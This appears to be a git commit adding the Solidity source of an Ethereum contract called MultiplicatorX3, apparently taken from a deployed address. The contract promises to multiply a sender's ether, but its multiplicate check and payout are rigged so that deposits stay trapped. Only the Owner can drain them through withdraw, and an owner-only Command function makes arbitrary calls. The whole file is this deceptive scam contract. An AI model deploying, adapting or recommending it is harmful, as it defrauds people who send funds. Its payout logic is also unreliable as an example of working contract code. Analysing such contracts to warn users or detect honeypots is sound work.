87418b14de9954b62752b85a04b016aeb452fc56
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-16 12:15:26 +0700

    add contract MultiplicatorX3

---
+++ MultiplicatorX3.sol
@@ -0,0 +1,37 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract MultiplicatorX3 at 0x5aA88d2901C68fdA244f1D0584400368d2C8e739
+*/
+pragma solidity ^0.4.18;
+
+contract MultiplicatorX3
+{
+    address public Owner = msg.sender;
+   
+    function() public payable{}
+   
+    function withdraw()
+    payable
+    public
+    {
+        require(msg.sender == Owner);
+        Owner.transfer(this.balance);
+    }
+    
+    function Command(address adr,bytes data)
+    payable
+    public
+    {
+        require(msg.sender == Owner);
+        adr.call.value(msg.value)(data);
+    }
+    
+    function multiplicate(address adr)
+    public
+    payable
+    {
+        if(msg.value>=this.balance)
+        {        
+            adr.transfer(this.balance+msg.value);
+        }
+    }
+}
